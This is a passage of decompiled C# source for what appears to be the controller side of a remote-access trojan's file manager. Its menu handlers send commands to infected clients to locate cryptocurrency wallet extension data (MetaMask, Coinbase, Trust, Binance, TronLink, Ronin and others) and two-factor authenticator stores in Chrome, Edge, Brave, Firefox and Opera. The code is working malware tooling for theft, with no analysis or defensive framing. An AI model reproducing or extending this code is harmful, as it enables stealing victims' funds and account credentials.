				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = "TronLinkChrome";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x060003B1 RID: 945 RVA: 0x0002CB6C File Offset: 0x0002AD6C
		private void chromeToolStripMenuItem4_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = "BitKeep";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x060003B2 RID: 946 RVA: 0x0002CBF0 File Offset: 0x0002ADF0
		private void chromeToolStripMenuItem5_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = "Coinbase";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x060003B3 RID: 947 RVA: 0x0002CC74 File Offset: 0x0002AE74
		private void chromeToolStripMenuItem6_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = "Ronin";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x060003B4 RID: 948 RVA: 0x0002CCF8 File Offset: 0x0002AEF8
		private void chromeToolStripMenuItem7_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = "Trust";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x060003B5 RID: 949 RVA: 0x0002CD7C File Offset: 0x0002AF7C
		private void chromeToolStripMenuItem8_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = "BitPay";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x060003B6 RID: 950 RVA: 0x0002CE00 File Offset: 0x0002B000
		private void chromeToolStripMenuItem9_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = "F2aChrome";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x060003B7 RID: 951 RVA: 0x0002CE84 File Offset: 0x0002B084
		private void edgeToolStripMenuItem3_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = "F2aEdge";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x060003B8 RID: 952 RVA: 0x0002CF08 File Offset: 0x0002B108
		private void braveToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = "F2aBrave";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x060003B9 RID: 953 RVA: 0x0002CF8C File Offset: 0x0002B18C
		private void binanceToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = "Binance";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x060003BA RID: 954 RVA: 0x00002287 File Offset: 0x00000487
		private void listView1_SelectedIndexChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x060003BB RID: 955 RVA: 0x0002D010 File Offset: 0x0002B210
		private void firefoxToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = "MetaFirefox";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x060003BC RID: 956 RVA: 0x0002D094 File Offset: 0x0002B294
		private void toolStripStatusLabel1_Click(object sender, EventArgs e)
		{
			try
			{
				Clipboard.SetText(this.textBox1.Text);
			}
			catch
			{
			}
		}

		// Token: 0x060003BD RID: 957 RVA: 0x0002D0C8 File Offset: 0x0002B2C8
		private void operaToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = "MetaOpera";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x060003BE RID: 958 RVA: 0x0002D14C File Offset: 0x0002B34C
		private void operaGXToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = "MetaOperaGX";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}
	}
}
